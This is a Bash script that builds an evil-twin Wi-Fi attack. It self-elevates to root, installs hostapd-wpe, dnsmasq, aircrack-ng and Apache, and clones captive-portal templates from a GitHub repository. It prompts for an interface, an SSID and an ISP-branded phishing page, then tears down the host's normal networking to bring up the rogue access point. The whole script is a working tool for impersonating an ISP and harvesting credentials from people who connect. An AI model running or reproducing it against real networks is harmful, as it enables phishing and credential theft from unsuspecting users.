# # 1) Auto-sudo-up if needed
if [[ $EUID -ne 0 ]]; then
  echo "ℹ  Re-running as root…"
  exec sudo bash "$0" "$@"
fi

# from here on, you can remove all 'sudo' inside your functions


required_pac=("apache2" "dnsmasq" "hostapd-wpe" "aircrack-ng" "libapache2-mod-php")
# source ./install.sh 

check_packages(){

    dpkg -l | awk '{print $2}' | grep -xq "$1"
    if [[ $? -eq 0 ]]; then
        echo "$1 exists"
    else
        echo "You need to install $1."
        install_packages "$1"
    fi
}   

install_packages(){
    echo "checking $1"
    apt-cache show $1  > /dev/null 2>&1
    if [[ $? -eq 0 ]]; then
        apt update -y > /dev/null 
        echo "Found in apt repo. attempting to install."
        echo "Installing $1"
        apt install $1 -y > /dev/null 2>&1
        if [[ $? -eq 0 ]]; then
            echo "Installation $1 done"
        else
            echo "Something Went wrong. Try to manually install $1"
        fi
    else
        echo "Sorry! Not for you Currently."
    fi
}

get_templates(){

  git clone https://github.com/AvishekDhakal/resources.git
  cp -r ./resources/captive /var/www/html
  chown -R www-data:www-data /var/www/html/captive

  configuration_files
}

configuration_files(){

    if [[ -d ./resources ]]; then

        airmon-ng | sed '1,2d' | cut -f2- | nl 

        read -p "Interface Name:" IFACE
        sed -e "s|__IFACE__|$IFACE|" \
                ./resources/dnsmasq.conf.tmp > /etc/dnsmasq.d/dnsmasq.conf

        read -p "SSID Name:" SSID
        sed -e "s|__IFACE__|$IFACE|" \
            -e "s|__SSID__|$SSID|" \
            ./resources/host.conf.tmp > /etc/hostapd-wpe/$SSID.conf
        ln -sf /etc/hostapd-wpe/"$SSID".conf /etc/hostapd-wpe/hostapd-wpe.conf

        ls ./resources/captive | nl 
        echo "Choose among these"
        read -p "ISP name:" ISPNAME

        sed -e "s|__ISPNAME__|$ISPNAME|" \
            ./resources/000-portal.conf.tmp > /etc/apache2/sites-available/000-portal.conf

        rm -f /etc/apache2/sites-enabled/000-portal.conf
        a2dissite 000-default.conf &>/dev/null || true
        a2ensite 000-portal.conf
        a2enmod rewrite

        #here is the problem

        start_enable_services "$SSID"
        echo "sleeping for 30 seconds"
        sleep 30
        interface_managing "$IFACE"

        rm -rf ./resources

    else
        echo "The resources file seems to be missing"
    fi
}

interface_managing(){
    echo "Interface time"
    local iface=$1
    systemctl stop NetworkManager
    pkill wpa_supplicant 
    pkill dhclient
    ip link set dev $iface down
    ip addr flush dev $iface
    ip route flush dev $iface

    systemctl start hostapd-wpe.service

    ip addr add 192.168.1.1/24 dev $iface


    systemctl restart dnsmasq.service

}

start_enable_services(){
    echo "Starting services"
    start_pac=("apache2.service" "dnsmasq.service")
    for service in "${start_pac[@]}"; do
        systemctl start $service
    done
    systemctl reload apache2.service

}


if [[ -r /etc/os-release ]]; then   
    source /etc/os-release
fi 

distro_name="${ID,,}"  

if [[ "$distro_name" == "kali" || "$distro_name" == "debian" ]]; then 
    for package in "${required_pac[@]}"; do
        # echo "$package"
        check_packages "$package"
    done
    get_templates
else
    echo "Unsupported distro: $distro_name"
    exit 1
fi







